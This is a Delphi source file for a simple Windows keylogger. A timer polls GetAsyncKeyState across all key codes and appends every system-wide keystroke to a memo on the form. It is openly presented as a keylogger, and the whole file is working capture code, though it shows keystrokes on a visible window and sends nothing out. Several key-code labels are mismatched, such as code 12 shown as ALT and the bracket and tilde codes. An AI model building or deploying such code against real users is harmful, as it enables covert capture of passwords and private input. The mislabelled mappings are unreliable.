unit Unit1;
(******************************************************)
(*                                                    *)
(*    Simple Keylogger without hook (Single values)   *)
(*        Timothy Schiess                             *)
(*       19.02.2015                                   *)
(*                                                    *)
(******************************************************)
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Memo1: TMemo;
    Timer1: TTimer;
    Memo2: TMemo;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function DisplayAction(txt: String): String;
begin
form1.Memo1.Lines.add(txt);
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
Memo1.text := '';
Memo2.Text := '';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
ikey, KeyResult : Integer;
begin
ikey := 0;
Repeat
  keyresult := GetAsyncKeyState(ikey);
  if KeyResult = -32767 then
  begin
  case Ikey of
8: DisplayAction(' [BACKSPACE] ');
9: DisplayAction(' [TAB] ');
12: DisplayAction(' [ALT] ');
13: DisplayAction(' [ENTER] ');
16: DisplayAction(' [SHIFT] ');
17: DisplayAction(' [CONTROL] ');
18: DisplayAction(' [ALT] ');
20: DisplayAction(' [CAPS LOCK] ');
96: DisplayAction(' 0 ');
97: DisplayAction(' 1 ');
98: DisplayAction(' 2 ');
99: DisplayAction(' 3 ');
100: DisplayAction(' 4 ');
101: DisplayAction(' 5 ');
102: DisplayAction(' 6 ');
103: DisplayAction(' 7 ');
104: DisplayAction(' 8 ');
105: DisplayAction(' 9 ');
106: DisplayAction(' * ');
107: DisplayAction(' + ');
109: DisplayAction(' - ');
111: DisplayAction(' / ');
112: DisplayAction(' [F1] ');
113: DisplayAction(' [F2] ');
114: DisplayAction(' [F3] ');
115: DisplayAction(' [F4] ');
116: DisplayAction(' [F5] ');
117: DisplayAction(' [F6] ');
118: DisplayAction(' [F7] ');
119: DisplayAction(' [F8] ');
120: DisplayAction(' [F9] ');
121: DisplayAction(' [F10] ');
122: DisplayAction(' [F11] ');
123: DisplayAction(' [F12] ');
187: DisplayAction(' = ');
188: DisplayAction(' , ');
189: DisplayAction(' - ');
190: DisplayAction(' . ');
191: DisplayAction(' ; ');
192: DisplayAction(' " ');
193: DisplayAction(' / ');
219: DisplayAction(' ´ ');
220: DisplayAction(' ] ');
221: DisplayAction(' [ ');
222: DisplayAction(' ~ ');
226: DisplayAction(' \ ');
else
if (ikey >=32) and (Ikey <=110) then
  begin
if (ikey >= 65) and (ikey <= 90) then
Memo1.Text := Memo1.Text + Chr(ikey);
if (ikey >= 32) and (ikey <= 63) then
Memo1.Text := Memo1.Text + Chr(ikey);
//numpad keycodes
if (ikey >= 96) and (ikey <= 110) then
Memo1.Text := Memo1.Text + Chr(ikey);
  end
else
memo1.Lines.add(IntToStr(ikey));
end;
end; //case;
inc(ikey);
until ikey = 255;
end;

end.
